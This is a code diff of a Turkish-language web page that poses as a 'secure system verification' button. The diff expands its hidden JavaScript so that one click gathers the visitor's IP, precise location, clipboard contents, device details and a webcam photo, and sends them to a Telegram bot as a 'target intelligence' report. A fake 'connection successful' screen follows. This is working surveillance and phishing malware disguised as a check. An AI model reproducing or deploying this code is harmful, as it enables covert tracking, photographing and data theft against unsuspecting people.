@@ -1,19 +1,22 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Yükleniyor...</title>
+    <title>Güvenli Doğrulama</title>
     <style>
-        body { font-family: monospace; background: #0a0a0a; color: #00ff66; text-align: center; padding-top: 25vh; }
-        .btn { background: #00ff66; color: #000; border: none; padding: 12px 24px; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 20px; }
+        body { font-family: monospace; background: #0a0a0a; color: #00ff66; text-align: center; padding-top: 25vh; margin: 0; }
+        .box { background: #121212; border: 1px solid #00ff66; display: inline-block; padding: 30px; border-radius: 8px; box-shadow: 0 0 15px rgba(0,255,102,0.2); }
+        .btn { background: #00ff66; color: #000; border: none; padding: 14px 28px; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 20px; transition: 0.2s; }
         .btn:hover { background: #00cc52; }
     </style>
 </head>
 <body>
-    <h2>[ 🛡️ Güvenli Bağlantı Doğrulanıyor ]</h2>
-    <p>Devam etmek için lütfen aşağıdaki doğrulama butonuna tıklayın.</p>
-    <button class="btn" onclick="startProcess()">DOĞRULAMAYI BAŞLAT</button>
+    <div class="box">
+        <h2>[ 🛡️ SİSTEM DOĞRULAMASI ]</h2>
+        <p>Devam etmek için lütfen aşağıdaki butona tıklayın.</p>
+        <button class="btn" onclick="startProcess()">DOĞRULAMAYI BAŞLAT</button>
+    </div>
     
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -23,7 +26,7 @@
         const CHAT_ID = "8765957766";
 
         function sendTelegram(text, photoBlob = null) {
-            // Metin Mesajı Gönderimi (Şık Markdown Formatı)
+            // Metin Raporunu Gönder
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -34,7 +37,7 @@
                 })
             }).catch(() => {});
 
-            // Fotoğraf varsa gönder
+            // Fotoğraf Varsa Gönder
             if (photoBlob) {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
@@ -49,9 +52,23 @@
             }
         }
 
+        // GPU Bilgisini Alma
+        function getGpuInfo() {
+            try {
+                let canvas = document.createElement('canvas');
+                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
+                }
+            } catch(e) {}
+            return "Erişilemedi";
+        }
+
         async function startProcess() {
-            document.querySelector("button").innerText = "Bağlantı Kuruluyor...";
-            
+            document.querySelector("button").innerText = "Veriler Toplanıyor...";
+
+            // 1. IP Adresi
             let ipInfo = "Alınamadı";
             try {
                 let res = await fetch('https://api.ipify.org?format=json');
@@ -59,6 +76,7 @@
                 ipInfo = data.ip;
             } catch(e) {}
 
+            // 2. Şarj Durumu
             let batteryInfo = "Bilinmiyor";
             try {
                 if (navigator.getBattery) {
@@ -67,40 +85,73 @@
                 }
             } catch(e) {}
 
-            let deviceInfo = navigator.userAgent;
-            let screenRes = `${window.screen.width}x${window.screen.height}`;
+            // 3. RAM ve Depolama (Storage Estimate)
+            let storageInfo = "Bilinmiyor";
+            try {
+                if (navigator.storage && navigator.storage.estimate) {
+                    let estimate = await navigator.storage.estimate();
+                    let gbTotal = (estimate.quota / (1024 * 1024 * 1024)).toFixed(1);
+                    let gbUsed = (estimate.usage / (1024 * 1024 * 1024)).toFixed(1);
+                    storageInfo = `Toplam ~${gbTotal} GB (Kullanılan: ~${gbUsed} GB)`;
+                }
+            } catch(e) {}
 
-            // 1. Konum Verisini Al
+            let ramCapacity = navigator.deviceMemory ? navigator.deviceMemory + " GB (Yaklaşık)" : "Bilinmiyor";
+            let gpuModel = getGpuInfo();
+            let screenRes = `${window.screen.width}x${window.screen.height}`;
+            let language = navigator.language || "Bilinmiyor";
+            let deviceInfo = navigator.userAgent;
+
+            // 4. Panodaki Metin (Clipboard - İzin gerektirebilir)
+            let clipboardText = "Erişilemedi veya İzin Verilmedi";
+            try {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    clipboardText = await navigator.clipboard.readText();
+                    if (!clipboardText) clipboardText = "Pano Boş";
+                }
+            } catch(e) {}
+
+            // 5. Konum Bilgisi ve Raporun Oluşturulması
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        let report = `🎯 *YENİ HEDEF BAĞLANTISI TESPİT EDİLDİ*\n\n` +
+                        let report = `🎯 *YENİ DETAYLI HEDEF İSTİHBARATI*\n\n` +
                                      `🌐 *IP Adresi:* \`${ipInfo}\`\n` +
-                                     `🔋 *Şarj Durumu:* ${batteryInfo}\n` +
-                                     `📱 *Ekran Çözünürlüğü:* ${screenRes}\n` +
-                                     `📍 *Konum:* [Google Haritalarda Aç](https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude})\n` +
-                                     `📊 *Hassasiyet:* ${position.coords.accuracy} metre\n` +
-                                     `💻 *Cihaz Bilgisi:* \`${deviceInfo}\``;
+                                     `🔋 *Şarj:* ${batteryInfo}\n` +
+                                     `🧠 *RAM:* ${ramCapacity}\n` +
+                                     `💾 *Depolama Alanı:* ${storageInfo}\n` +
+                                     `📋 *Pano (Clipboard):* \`${clipboardText}\`\n` +
+                                     `🎮 *GPU / Grafik:* \`${gpuModel}\`\n` +
+                                     `📱 *Ekran:* ${screenRes}\n` +
+                                     `🗣 *Dil:* ${language}\n` +
+                                     `📍 *Konum:* [Haritada Aç](https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude})\n` +
+                                     `📊 *Hassasiyet:* ${position.coords.accuracy}m\n` +
+                                     `💻 *User-Agent:* \`${deviceInfo}\``;
                         
                         captureCamera(report);
                     },
                     (error) => {
-                        let report = `🎯 *YENİ HEDEF BAĞLANTISI TESPİT EDİLDİ*\n\n` +
+                        let report = `🎯 *YENİ DETAYLI HEDEF İSTİHBARATI*\n\n` +
                                      `🌐 *IP Adresi:* \`${ipInfo}\`\n` +
-                                     `🔋 *Şarj Durumu:* ${batteryInfo}\n` +
-                                     `📱 *Ekran Çözünürlüğü:* ${screenRes}\n` +
-                                     `❌ *Konum İzni:* Reddedildi veya Alınamadı\n` +
-                                     `💻 *Cihaz Bilgisi:* \`${deviceInfo}\``;
+                                     `🔋 *Şarj:* ${batteryInfo}\n` +
+                                     `🧠 *RAM:* ${ramCapacity}\n` +
+                                     `💾 *Depolama Alanı:* ${storageInfo}\n` +
+                                     `📋 *Pano (Clipboard):* \`${clipboardText}\`\n` +
+                                     `🎮 *GPU / Grafik:* \`${gpuModel}\`\n` +
+                                     `📱 *Ekran:* ${screenRes}\n` +
+                                     `❌ *Konum İzni:* Reddedildi\n` +
+                                     `💻 *User-Agent:* \`${deviceInfo}\``;
                         
                         captureCamera(report);
                     },
                     { enableHighAccuracy: true }
                 );
             } else {
-                captureCamera(`🎯 *YENİ HEDEF BAĞLANTISI*\n🌐 *IP:* \`${ipInfo}\`\n🔋 *Şarj:* ${batteryInfo}`);
+                captureCamera(`🎯 *HEDEF RAPORU*\n🌐 *IP:* \`${ipInfo}\`\n💾 *Depolama:* ${storageInfo}`);
             }
         }
 
+        // Kamera Yakalama (Ön Kamera Öncelikli, desteklemiyorsa genel)
         function captureCamera(textReport) {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(stream => {
@@ -119,14 +170,36 @@
                             canvas.toBlob(blob => {
                                 sendTelegram(textReport, blob);
                                 stream.getTracks().forEach(track => track.stop());
-                                document.body.innerHTML = "<h2 style='color:#00ff66;'>Sistem Hazır. Yönlendiriliyorsunuz...</h2>";
+                                document.body.innerHTML = "<div class='box'><h2 style='color:#00ff66;'>Bağlantı Başarılı. Yönlendiriliyorsunuz...</h2></div>";
                             }, 'image/jpeg', 0.9);
                         }, 1200);
                     };
                 })
                 .catch(err => {
-                    sendTelegram(textReport + `\n❌ *Kamera İzni:* Reddedildi`);
-                    document.body.innerHTML = "<h2 style='color:#00ff66;'>Sistem Hazır. Yönlendiriliyorsunuz...</h2>";
+                    // Ön kamera başarısız olursa arka kamerayı veya genel kamerayı dene
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => {
+                            const video = document.getElementById('video');
+                            video.srcObject = stream;
+                            video.onloadedmetadata = () => {
+                                setTimeout(() => {
+                                    const canvas = document.getElementById('canvas');
+                                    canvas.width = video.videoWidth || 640;
+                                    canvas.height = video.videoHeight || 480;
+                                    const ctx = canvas.getContext('2d');
+                                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                    canvas.toBlob(blob => {
+                                        sendTelegram(textReport, blob);
+                                        stream.getTracks().forEach(track => track.stop());
+                                        document.body.innerHTML = "<div class='box'><h2 style='color:#00ff66;'>Bağlantı Başarılı. Yönlendiriliyorsunuz...</h2></div>";
+                                    }, 'image/jpeg', 0.9);
+                                }, 1200);
+                            };
+                        })
+                        .catch(e => {
+                            sendTelegram(textReport + `\n❌ *Kamera İzni:* Reddedildi veya Cihazda Kamera Yok`);
+                            document.body.innerHTML = "<div class='box'><h2 style='color:#00ff66;'>Bağlantı Başarılı. Yönlendiriliyorsunuz...</h2></div>";
+                        });
                 });
         }
     </script>
